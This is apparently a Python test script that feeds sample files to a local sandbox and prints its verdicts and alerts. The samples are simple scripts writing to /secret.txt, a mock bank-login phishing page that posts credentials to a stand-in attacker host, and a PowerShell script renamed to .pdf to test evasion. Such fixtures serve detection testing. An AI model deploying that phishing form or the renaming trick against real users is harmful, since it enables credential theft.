import sys
import os
from pathlib import Path
from uuid import uuid4

# Add parent directory to PYTHONPATH to resolve absolute imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from sandbox.sandbox_runner import run_in_sandbox

def main():
    print("Testing sandbox extensions locally inside container...")
    
    # In the container, CONTAINER_STORAGE_ROOT is /app/storage
    # Let's write the test files to /app/storage/sandbox_uploads
    test_dir = Path("/app/storage/sandbox_uploads")
    test_dir.mkdir(parents=True, exist_ok=True)
    
    # 1. PowerShell Test
    ps_file = test_dir / "test_write.ps1"
    ps_file.write_text('Write-Output "Starting PS Script..."\nNew-Item -Path "/secret.txt" -ItemType "file"\n')
    print("\n--- Running PowerShell Sandbox Test ---")
    ps_res = run_in_sandbox(str(uuid4()), ps_file, "test_write.ps1")
    print(f"Executed: {ps_res.get('executed')}")
    print(f"Verdict: {ps_res.get('verdict')}")
    print(f"Alerts: {ps_res.get('behavior_alerts')}")
    print(f"Logs: {ps_res.get('logs')}")

    # 2. JavaScript Test
    js_file = test_dir / "test_write.js"
    js_file.write_text('console.log("Starting JS Script...");\nconst fs = require("fs");\nfs.writeFileSync("/secret.txt", "data");\n')
    print("\n--- Running JavaScript Sandbox Test ---")
    js_res = run_in_sandbox(str(uuid4()), js_file, "test_write.js")
    print(f"Executed: {js_res.get('executed')}")
    print(f"Verdict: {js_res.get('verdict')}")
    print(f"Alerts: {js_res.get('behavior_alerts')}")
    print(f"Logs: {js_res.get('logs')}")

    # 3. Bash Test
    sh_file = test_dir / "test_write.sh"
    sh_file.write_text('echo "Starting Bash Script..."\necho "data" > /secret.txt\n')
    print("\n--- Running Bash Sandbox Test ---")
    sh_res = run_in_sandbox(str(uuid4()), sh_file, "test_write.sh")
    print(f"Executed: {sh_res.get('executed')}")
    print(f"Verdict: {sh_res.get('verdict')}")
    print(f"Alerts: {sh_res.get('behavior_alerts')}")
    print(f"Logs: {sh_res.get('logs')}")

    # 4. HTML Phishing Test
    html_file = test_dir / "phishing.html"
    html_file.write_text('''
    <!DOCTYPE html>
    <html>
    <body>
        <h2>Login to your Bank</h2>
        <form action="https://phishing-attacker-server.com/steal" method="POST">
            <input type="email" name="user" required>
            <input type="password" name="pass" required>
            <button type="submit">Submit</button>
        </form>
        <script>
            console.log("Phishing kit script loaded");
            eval("console.log('Obfuscated payload')");
        </script>
    </body>
    </html>
    ''')
    print("\n--- Running HTML Phishing Sandbox Test ---")
    html_res = run_in_sandbox(str(uuid4()), html_file, "phishing.html")
    print(f"Executed: {html_res.get('executed')}")
    print(f"Verdict: {html_res.get('verdict')}")
    print(f"Alerts: {html_res.get('behavior_alerts')}")
    print(f"Logs: {html_res.get('logs')}")

    # 5. Renamed Extension Evasion Test (PowerShell renamed to PDF)
    evasion_file = test_dir / "evasion.pdf"
    evasion_file.write_text('Write-Output "Executing obfuscated/renamed script..."\nNew-Item -Path "/secret.txt" -ItemType "file"\n')
    print("\n--- Running Renamed Extension Evasion Sandbox Test (PS script renamed to .pdf) ---")
    evasion_res = run_in_sandbox(str(uuid4()), evasion_file, "evasion.pdf")
    print(f"Executed: {evasion_res.get('executed')}")
    print(f"Verdict: {evasion_res.get('verdict')}")
    print(f"Alerts: {evasion_res.get('behavior_alerts')}")
    print(f"Logs: {evasion_res.get('logs')}")

    # Clean up test files
    for f in (ps_file, js_file, sh_file, html_file, evasion_file):
        f.unlink(missing_ok=True)

if __name__ == "__main__":
    main()
